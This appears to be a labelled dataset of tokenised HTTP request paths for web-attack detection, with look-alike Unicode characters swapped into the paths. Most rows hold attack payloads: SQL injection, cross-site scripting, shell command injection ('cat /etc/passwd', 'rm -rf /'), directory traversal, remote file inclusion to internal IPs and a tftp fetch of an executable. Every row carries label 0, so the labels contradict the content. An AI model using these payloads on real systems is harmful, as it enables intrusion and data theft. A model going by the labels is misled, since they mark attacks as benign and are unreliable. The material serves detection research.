sentences 	 labels
/ ƽ𐐽ripts / ycqbbdpf . exe  	 0
/ 𝙨𝑡ring / modo = registro & login = csua & password = mu & nombre = giselle & apellidos = garfano + leguizamn & email = woodson @ tabernarincon @ ete . ug & dni = 40660740y & direccion = c /  + albert + einstein + 118 +  & ciudad = cendejas + de + enmedio & cp = 33520 & provincia = ourense & ntc = 4214809525884531 & b1 = registrar  	 0
/ Ꮒꬲader . inc . php ? cssfile = xxpathxx  	 0
/ 𝓈𝗍ring / strings / parameters = -9583 '  )  )  union all select 6392 , 6392 , 6392 , 6392 , 6392 , 6392 , 6392 , 6392 , 6392 , 6392 #  	 0
/ 𝓉o𝙥 . php ? stuff =  " ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 0
/ 𝓉o𝓅 . php ? stuff =  ; rm \ x09q71367433 \ x09 #  	 0
/ 𝒔𝘵ring / strings / parameters = -4736 '  )  )  or elt ( 5835 = 5509 , 5509 )  and  (  (  ' iawg '  =  ' iawg  	 0
/ 𝒔𝘁ring / strings / parameters = 1 ,  ( select  *  from generate_series ( 5609 , 5609 , case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 )  	 0
/ 𝚜𝕥ring / strings / parameters = -3109 "  "  or elt ( 1032 = 1032 , 3623 )  	 0
/ m𝙖𝚒n . php ? stuff =  ; del \ x09q56931967 \ x09 #  	 0
/ m𝒂𝙞n . php ? logout =  " rm q41454446 & rem  	 0
/ ƽ𝚝ring / strings / parameters = 1 '  +  ( select vlut where 9517 = 9517 union all select null , null , null --  	 0
/ 𝐬𝓽ring / strings / parameters = 1 %  "  "  )  )  ; select  ( case when  ( 6047 = 8897 )  then 6047 else 6047 *  ( select 6047 from information_schema . character_sets )  end )  #  	 0
/ 𝓭🯴4uk9h2 . fts ?  < script > document . cookie =  " testmybc = 2088 ;  "  <  / script >  	 0
/ еn-𝙪s / esmozg5d . mscgi ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𑣁𝓉ring / strings / parameters = 1 '  in boolean mode )  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  #  	 0
/ 𝚝o𝑝 . php ? stuff =  & ver \ x0b > q83761749 & rem \ x0b  	 0
/ ⅽ𝗴i-bin / sgdynamo . exe ? htname =  < script > foo <  / script >  	 0
/ 𝘩𝒆lp . php ? q =  '  \ x0adel q22265597  #  	 0
/ ѕ𝖙ring / modo = registro & login = z '  * ola & password = mohatrera & nombre = helga & apellidos = peratill & email = hauser @ whitepearlresort . as & dni = 88363371q & direccion = calle + sandoval + 135 ,  + 4 ? b & ciudad = sdaba & cp = 40183 & provincia = zaragoza & ntc = 6865627677043866 & b1 = registrar  	 0
/ 𝐬𝑡ring / modo = registro & login = watchorn & password = gin09r9n3 & nombre = alcira & apellidos = marcapura + pachecote & email = wolheim @ soyrojo . se & dni = 79531407y & direccion = calle + la + gran * ja ,  +  + 150 ,  + 1 ? c & ciudad = deleitosa & cp = 49410 & provincia = baleares +  ( illes )  & ntc = 4881993166167995 & b1 = registrar  	 0
/ 𝟎z𝟝75z74 . htm ?  < script > document . cookie =  " testuhsv = 9753 ;  "  <  / script >  	 0
/ m𝖎z𑢯r5hz . aspx ?  < script > document . cookie =  " testviqu = 1270 ;  "  <  / script >  	 0
/ 𝒔𝔱ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo iugzra )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝑎𝖽min / index . php ? act = login & username =  '  union select 1 ,  ' pafaq_10b4 . nasl '  ,  ' 5e0bd03bec244039678f2b955a2595aa '  ,  '  '  , 0 ,  '  '  ,  '  '  --  & password = nessus  	 0
/ 𝘴𝕥ring / strings / parameters = 1 "  "  and char ( 107 )  |  | char ( 121 )  |  | char ( 97 )  |  | char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝐬𝓽ring / strings / parameters = '  echo bzyozx $  (  ( 41 + 40 )  )  $  ( echo bzyozx ) bzyozx "  	 0
/ քo𝗿um-ra_professionnel . asp ? n =  / etc / passwd  	 0
/ 𝐬𝑐ripts / default . asp  	 0
/ 𝒔𝕥ring / strings / parameters = 1 '  |  |  ( select  ' ytwz '  from dual where 3025 = 3025 and  ( 5039 = 5303 )  * 5303 )  |  |  '  	 0
/ 𝘴𝚝ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hixnbs )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ ⅆ𝔞taservice . asmx / authuser ? username =  ' nessus1331908868 & password = nasl & needcompress = 0  	 0
/ 𝕤𝘁ring / str =  $  ( echo gskkxz )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  	 0
/ 𝖼ցi-sys / gw5 / gwweb . exe ? htmlver = aaa & get-context  	 0
/ 𝓼𝕥ring / strings / parameters = 1 '  ; select  ( case when  ( 3681 = 5989 )  then 3681 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual --  	 0
/ 𝕤𝓉ring / strings / parameters = "  ) print (  ` echo nbpptv \ necho  $  (  ( 1 + 63 )  )  \ necho nbpptv \ necho nbpptv `  )  ;  \  \ nbpptv  	 0
/ 𝐬𝓉ring / modo = insertar & precio = 4320 & b1 = pasar + por + caja /  	 0
/ 𝙨𝒕ring / modo = registro & login = li * bor7 & password = al9u12z3 & nombre = basiana & apellidos = fiesco + terrazas & email = wakefield . yniguez @ aebo . so & dni = 43471294y & direccion = c /  + santa + florentina + 9 ,  + 11 ? h & ciudad = asparrena & cp = 16841 & provincia = lleida & ntc = 6355628611222298 & b1 = registrar  	 0
/ ƽ𝖙ring / strings / parameters = -3304 '  )  )  order by 1 --  	 0
/ 𝒔𝖙ring / strings / parameters = 1 '  )  ; select pg_sleep ( 5 )  --  	 0
/ 𝕣𝗮anw4ia . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝘤om𝖕onents / com_rsgallery / rsgallery . html . php ? mosconfig_absolute_path = xxpathxx  	 0
/ 𝗵𝔱8pn8uq . aspx ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𐑈𝑡ring / strings / parameters = 1 )  )  and 2006 = 2006  	 0
/ 𝙨𝕥ring / modo = registro & login = rajan & password = palmear & nombre = amparo & apellidos = martin + bansells & email = hampden-baker8 @ unidadesdeventilacion . cy & dni = 48800601y & direccion = calle + formentera ,  + 184 + 4-c & ciudad = san + garca + de + ingelmos & cp = 37129 & provincia = burgos & ntca = 1524098225377304 & b1 = registrar  	 0
/ 𝘥𝟦4uk9h2 . x ?  < meta http-equiv = set-cookie content =  " testmybc = 2088 "  >  	 0
/ 𝔠ook𝘪e /  ? name = nessus & value =  < script > alert (  ' jetty_cookie_xss . nasl '  )  <  / script >  & age = 288  	 0
/ 𝖘𝘵ring / strings / parameters = echo $ ifscobxoa $  (  ( 38 + 15 )  )  $  ( echo $ ifscobxoa ) cobxoa |  	 0
/ z𝙫ଃtv7h8 . php ?  < meta http-equiv = set-cookie content =  " testcqwz = 9752 "  >  	 0
/ 𝒔𝓽ring / strings / parameters = < input type =  " text "  value =  `  `   < div / onmouseover =  ' alert ( 1 )  '  > x <  / div >  	 0
/ 𝘀𝐭ring / strings / parameters = |   [  2 -ne  $  ( echo pfmsxe  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ ꭒ𑣁r / extensions / get_tree . inc . php ? globals [ root_path ]  = xxpathxx  	 0
/ ℯn-𝖚s / oie504mr . htm ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 0
/ j𝔞𝐯ascript / retail . exe  	 0
/ 𐑈𝓽ring / strings / parameters = |   [  7 -ne  $  ( echo jlugpx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 0
/ 𝘀𝓉ring / strings / parameters = -8667 '  +  ( select ymmg where 6132 = 6132 union all select 6132 , 6132 , 6132 , 6132 , 6132 , 6132 , 6132 , 6132 #  	 0
/ 𝐬𝙩ring / strings / parameters = a | id  	 0
/ 𝗊ꭒagynka . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/  /  <  / p >  < body >  < script / src =  " http :  /  / www . example . com / test ? rnd = q97851284 "  >  <  / script >  < p >  	 0
/ 𝕤𝓽ring / strings / parameters = 1 )  )  as hxtp where 5478 = 5478 and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  --  	 0
/ ℯ⤫amples / servlets / servlet / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1680418306 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝒔𝗍ring / id = any  set-cookie :  + tamper = 5765205567234876235 & nombre = vino + rioja & precio = 85 & cantidad = 98 & b1 = aadir + al + carrito  	 0
/ j𑢯𝓻dyhw8 . idc ?  < script > document . cookie =  " testrluj = 1420 ;  "  <  / script >  	 0
/ 𝐬𝐭ring / strings / parameters = '  | echo kieldl $  (  ( 12 + 2 )  )  $  ( echo kieldl ) kieldl '  	 0
/ m𝑎𝒊n . php ? logout =  " rm ; q82885471 & rem ;  	 0
/ O𝒘155a7c . dll ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝐬𝘁ring / strings / parameters = 1 '  and sleep ( 5 )  #  	 0
/ 𝚞𑜆azfs7p . html ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 0
/ 𝒔𝑡ring / strings / parameters = < input type =  " text "  name =  " a "  	 0
/ j𝖺𝘃ascript / 1990 . exe  	 0
/ ᴜ𝐰iyxrvhad . exe  	 0
/ ꭚꓒexw8by . cfc ?  < meta http-equiv = set-cookie content =  " testulex = 4996 "  >  	 0
/ ƽ𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo wsmvbw )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 0
/ 𝓉𝟟tm4m0b . html ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ j𝚊ᴠascript / order . exe  	 0
/ 𝕤𝚝ring / strings / parameters = 1 "  "  )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  (  "  " weku "  "  like  "  " weku  	 0
/ 𝐬𝗍ring / id =  |  	 0
/ n𝟗𝘅lumt5 . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ꬲ𝘹amples / jsp / cal /  ? mod = read & id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ l𝒂𝒕ex . php ? bibtexrootrel = xxpathxx ?  	 0
/ 𝑎𝚍mincp / auth / checklogin . php ? cfgprogdir = xxpathxx  	 0
/ ƽ𝔠ripts / 3hrgytw . exe ?  / x +  / c + tftp -i 192 . 168 . 202 . 118 get wfqdljio oguyjway . exe  	 0
/ 𝓼𝘁ring / strings / parameters = -5700 where 4238 = 4238 union all select 4238 , 4238 , 4238 #  	 0
/ 𝗌𝒕ring / strings / parameters = '  ; echo $ ifsvzdgls $  (  ( 78 + 51 )  )  $  ( echo $ ifsvzdgls ) vzdgls  	 0
/ 𝓫𝘢sebuilder / src / main . inc . php ? mj_config [ src_path ]  = xxpathxx ?  ?  ?  	 0
/ 𑣁𝚝ring / strings / parameters =  	 0
/ 𝓮𝗑amples / jsp / sessions / help . php ? section =  ' qualiteam_xcart_sql_xss . nasl  	 0
/ m𝒂𝑖n . php ? stuff =  "  & ver & rem ;  	 0
/ 𑣁𝖙ring / modo = entrar & login = neile & pwd = b7lg685 & remember = on /  & b1 = entrar  	 0
/ 𝑠𝒕ring / strings / parameters = "  |  | echo $ ifscbhhkp $  (  ( 85 + 54 )  )  $  ( echo $ ifscbhhkp ) cbhhkp |  	 0
/ 𝔰𝔱ring / strings / parameters = |   [  3 -ne  $  ( echo gqzijb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝕤𝔱ring / strings / parameters = ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1931 = 1931 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  	 0
/ ꬲхamples / jsp / checkbox / ovlaunch . exe  	 0
/ 𑣁𝒕ring / strings / parameters = echo $ ifsewpwsx $  (  ( 63 + 88 )  )  $  ( echo $ ifsewpwsx ) ewpwsx |  	 0
/ ℯ⤬amples / jsp / error / cal_week . php ? op = week & catview = 999 '  	 0
/ j𝒶ⅴascript / have . exe  	 0
/ ѕ𝘵ring / strings / parameters = "  &  & echo $ ifsquqqgm $  (  ( 39 + 7 )  )  $  ( echo $ ifsquqqgm ) quqqgm \  	 0
/ ѕ𝙩ring / strings / parameters = < script > alert ( 1 )  <  ! �?  	 0
/ 𝓫nଃ57frh . cgi ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ƽ𝔱ring / modo = entrar & login = thisner9 & pwd = tanganillas & remember = off /  & b1 = entrar  	 0
/ ꜱ𝘵ring / id = 3 & nombre = jamn + ibrico & precio = 85 /  & cantidad = 49 & b1 = aadir + al + carrito  	 0
/ 𝟕𝘂1pb2xi . cfm ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 0
/ 𝓅𝑟ofil . php ? config [ root_ordner ]  = xxpathxx ?  & cmd = id  	 0
/ 𝗌𝒕ring / strings / parameters = foo \ �? ;  alert ( document . cookie )  ;  /  / �? ;  	 0
/ 𝓈𝘁ring / strings / parameters = "  >  < img src = x onerror = window . open (  ' https :  /  / www . google . com /  '  )  ;  >  	 0
/ ѕ𝐭ring / strings / parameters = | echo $ ifsamcjyh $  (  ( 20 + 48 )  )  $  ( echo $ ifsamcjyh ) amcjyh \  \  	 0
/ 𝕤𝒕ring / strings / parameters = < meta http-equiv =  " link "  content =  "  <  %  ( css ) s >  ;  rel = stylesheet "  >  	 0
/ j𝕒ѵascript / crashes . exe  	 0
/ 𝓼𝑡ring / strings / parameters = 1 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  fyaq  	 0
/ е⤬amples / jsp / checkboxmultihtml . pl ? multi =  / etc / passwd \ x00html  	 0
/ 𝒔𝘁ring / strings / parameters = 1 '  )  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  ' luoj '  =  ' luoj  	 0
/  ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  	 0
/ m𝐚𝒾n . php ? logout =  \  \  '  	 0
/ 𐑈𝓽ring / strings / parameters = '  &  & echo $ ifsosnmtb $  (  ( 17 + 53 )  )  $  ( echo $ ifsosnmtb ) osnmtb |  	 0
/ n𝘂𝒽3zirz . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝑠𝓉ring / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 28 & b1 =  <  !  --  # exec + cmd =  " rm + -rf +  /  ; cat +  / etc / passwd "  +  --  >  	 0
/ іnⅾex . php ? src = 1 & _common = 1 & time = 1331905227 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝓈𝓽ring / strings / parameters = 1 )  where 2720 = 2720 and elt ( 4249 = 4249 , 7259 )  --  	 0
/ 𝗯ℯmarket / postscript / postscript . php ? p_mode = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 0
/ 𝒔𝐭ring / strings / parameters = & echo $ ifsoubrdr $  (  ( 47 + 29 )  )  $  ( echo $ ifsoubrdr ) oubrdr |  	 0
/ 𝔭𝚑pmyadmin / documentation . html ? phpmyadmin =  \  ; id  	 0
/ 𝕔o𝙧e / admin / categories . php ? categoriesenabled = yes & do = categories & action = del & absoluteurlxxpathxx  	 0
/ 𝐬𝑡ring / strings / parameters = < img src = javascript : while (  [  {  }  ]  )  ;  >  	 0
/ 𝑠𝚝ring / strings / parameters = |   [  3 -ne  $  ( echo lamxkc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 0
/ ⅇ𝚡amples / jsp / jsp2 / jspx / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ ѕ𝔱ring / strings / parameters = ; echo fgxigr $  (  ( 59 + 62 )  )  $  ( echo fgxigr ) fgxigr /  /  	 0
/ 𐐽lk ; 59162380 ; 7163019 ; i /  	 0
/ j𝙖𝒗ascript / youtube . exe  	 0
/ 𝔰𝒕ring / strings / parameters = "  . print (  ` echo hamonb `  .  ` echo  $  (  ( 26 + 57 )  )  `  .  ` echo hamonb `  .  ` echo hamonb `  )  ;  .  ' hamonb  	 0
/ 𝓼𝘁ring / strings / parameters = 1 '  )  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  (  ' wcmt '  =  ' wcmt  	 0
/ 𝘀𝚌ripts / sitemap . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  	 0
/ 𝚜𝘁ring / strings / parameters = 1 '  )  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  ' lshk '  like  ' lshk  	 0
/ ѕ𝐭ring / strings / parameters = 1 '  in boolean mode )  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  #  	 0
/ m𝗮ⅰn . php ? logout =  '  | sleep \ x098 \ x09 #  	 0
/ 𝚙𝟐p . exe  	 0
/ ρ𝕙pmyadmin / documentation . html ? phpmyadmin =  ` cat  / etc / passwd `  	 0
/ 𝓼𝗍ring / strings / parameters = 1 "  "  and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  --  	 0
/ 𝐬𝙩ring / strings / parameters = "  | echo $ ifshvknce $  (  ( 69 + 89 )  )  $  ( echo $ ifshvknce ) hvknce /  /  	 0
/ 𝑠𝙩ring / modo = registro & login = fadhel & password = canaler3 & nombre = damasio & apellidos = guito + mat & email = stribling . bettin @ bruoseguridad . ye & dni = 58753714f & direccion = calle + juan + bravo + 193 +  & ciudad = tubilla + del + agua & cp = 16340 & provincia =  ?  & ntc = 4927358900726396 & b1 = registrar  	 0
/ 𝚜𝐭ring / str =  $  ( echo ivbazq )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 0
/  ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  	 0
/ 𝙨𝔢arch . php ? searchstring =  < script > alert ( document . cookie )  <  / script >  	 0
/ 𝓈𝔱ring / strings / parameters = '  -- ixhumck limit -- mogmptzgyi 1 , 1 -- tpjijcnxaux union -- lldcqlfyffk all -- atqhorbn select -- aaoghwwht concat ( 0x3a7372773a , ifnull ( cast ( database (  )  -- nxgexooeyhm as -- twkpbn char )  , 0x20 )  , 0x3a6d79643a )  #  	 0
/ 𐐽𝒈i-local / fileseek2 . cgi ? foot =  ; cat  / etc / passwd & head =  	 0
/ 𝘴𝘁ring / strings / parameters = )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   --  	 0
/ 𝒅𝟧a5renl . asp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝘥𝙙a2qr7j . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝗌𝚝ring / strings / parameters = ;  str =  $  ( echo cuzhis )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ 𝐬𝗍ring / id = 1 & nombre = vino + rioja & precio = 85 & cantidad = 69 & b1 = aadir + al + carritoany  set-cookie :  + tamper = 5765205567234876235  	 0
/ j𝒅⤬255ea . htm ?  < script > document . cookie =  " testziyq = 5055 ;  "  <  / script >  	 0
/ ɡ𝗿uppen . php ? config [ root_ordner ]  = xxpathxx ?  & cmd = id  	 0
/ ѕ𝙩ring / modo = registro & login = teena & password = enranciar & nombre = julio & apellidos = guardiol + sim & email = heuser @ prensahp . mx & dni = 31293475c & direccion = calle + rejas ,  + 23 ,  + 4 ? b & ciudad = montiel & cp = 08183 & provincia = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & ntc = 5996994438589439 & b1 = registrar  	 0
/ 𝘀𝗍ring / strings / parameters = ;  str =  $  ( echo ysdkbb )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 0
/ m𝚊n𝐚ger / index . php ? src = 1 & _common = 1 & time = 1331904460 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝔰𝖙ring / modo = registro & login = arjun1 & password = lan $ a & nombre = walkiria & apellidos = tirado + paulet & email = arlen @ cienciapolicial . va & dni = 61317153g & direccion = gongora ,  + 129 +  & ciudad = gabiria & cp = 13333 & provincia = vallad ? oli + d & ntc = 6277517976007301 & b1 = registrar  	 0
/ 𑣁𝗍ring / strings / parameters = 1 '  +  ( select  ' mjgo '  where 4026 = 4026 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 0
/ 𝟗k𝘳0ih0v . cfc ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  	 0
/ 𝙨𝐭ring / modo = registro & login = kapil & password = d1c36o4ca & nombre = berina + del + valle & apellidos = artico & email = meunier . langa @ tintasultravioleta . al & dni = 17826694s & direccion = c /  + historiador + rodrigo + pertegas ,  + 149 ,  + 8-e & ciudad = palafolls '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & cp = 25218 & provincia = cceres & ntc = 3256313581077416 & b1 = registrar  	 0
/ j𝐚טascript / cfusion . exe  	 0
/ 𝑠𝓉ring / strings / parameters = ; echo jsdbim $  (  ( 99 + 35 )  )  $  ( echo jsdbim ) jsdbim "  	 0
/ 𑣁𝔱ring / strings / parameters = 1 "  "  )  )  as pxdp where 4575 = 4575 and elt ( 8258 = 7218 , 7218 )  --  	 0
/ 𝗌𝓉ring / strings / parameters = -4571 '  union all select 3227 , 3227 , 3227 , 3227 --  	 0
/ 𝕤𝖙ring / strings / parameters = -4323 '  )  )  or 6968 = 1393  	 0
/ 𝚜𝕥ring / modo = registro & login = sastry & password = 3l607lado2 & nombre = emmanuelle & apellidos = gonyalon + salobrea & email = bernt @ wdsl . yu & dni = 82709891m & direccion = calle + poligono + san + pablo + 143 + 6-d & ciudad = olmeda *  + de + las +  . fuentes & cp = 29711 & provincia = granada & ntc = 6789852392757283 & b1 = registrar  	 0
/ ꜱ𝖙ring / strings / parameters = &  & echo mvfpxa $  (  ( 61 + 74 )  )  $  ( echo mvfpxa ) mvfpxa |  	 0
/ 𝚜𝖙ring / strings / parameters = "  |   [  2 -ne  $  ( echo tiqlnl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝙨𝚝ring / strings / parameters = -4350 "  "  )  )  as mmwq where 9801 = 9801 or  ( 8520 = 2834 )  * 2834 --  	 0
/ 𝘀𝕥ring / strings / parameters = "  |   [  4 -ne  $  ( echo bwwrbc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ һ𝔢lp . php ? q =  "  \ x0drm \ x09q14674684 \ x09 #  	 0
/ 𑣁𝑡ring / strings / parameters = |  | echo $ ifswtnyev $  (  ( 5 + 53 )  )  $  ( echo $ ifswtnyev ) wtnyev '  	 0
/ 𝔠𝑔i-bin / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  	 0
/ 𝚜𝑡ring / modo = registro & login = yu-wei & password = mascadura & nombre = lihn & apellidos = ceal & email = mostel @ hipernavarra . mc & dni = 49437237w & direccion = paseo + escuelas + pias ,  + 119 ,  +  & ciudad = busto ,  + el & cp = 16779 & provincia = toledo & ntc = 6995607131571243 <  !  --  # include + file =  " archivo_secreto "  +  --  >  & b1 = registrar  	 0
/ 𝐬𝓉ring / strings / parameters = < img src =  " jav &  # x0a ; ascript : confirm (  < wbr > document . location )  ;  "  >  	 0
/ 𝕖𝘹amples / jsp / num / include / error / autherror . cfm ? errorcode = 1 & ftvar_linkp =  "  >  <  / a >  < script > alert (  ' fusetalk_mult_xss . nasl '  )  <  / script >  < a href =  "  	 0
/ 𝚜𝘁ring / strings / parameters = 1 '  )  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  and  (  ' cpoy '  =  ' cpoy  	 0
/ 𝕓𝓪se_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1332008637 '  )  <  / script >  	 0
/ 𝓼𝐭ring / strings / parameters = < a href =  "  \ xe1 \ x9a \ x80javascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 0
/ 𑣁𝗍ring / strings / parameters = ; echo $ ifsomaejd $  (  ( 8 + 77 )  )  $  ( echo $ ifsomaejd ) omaejd |  	 0
/ m𝘢𝗶n . php ? logout =  "  & del \ x0cq99238383 & rem \ x0c  	 0
/ 𝙨𝘵ring / strings / parameters = -7637 "  "  union all select 8498 , 8498 , 8498 --  	 0
/ 𝙥l𝖚gins / spamx / blacklist . examine . class . php ? _conf [ path ]  = xxpathxx  	 0
/ 𝔰𝖙ring / strings / parameters = % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e % e  	 0
/ 𝓪ⅆodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl  	 0
/ 𝒔𝕥ring / strings / parameters = < script > try  {  document . write ( document . location )  ;   }  catch ( e )   {  document . write ( e . message )  ;   }  <  / script >  	 0
/ 𝕤𝘵ring / modo = entrar & login = robbert & pwd = 5rgullecer & remember = on & b1 =  ' or ' a =  ' a  	 0
/ 𝓼𝙩ring / modo = entrar & login = toole & pwd =  , ap $ iladora & remember = on & b1 = entrar  	 0
/ 𝗏𝈆axg1p8 . x ?  < script > document . cookie =  " testxagh = 6987 ;  "  <  / script >  	 0
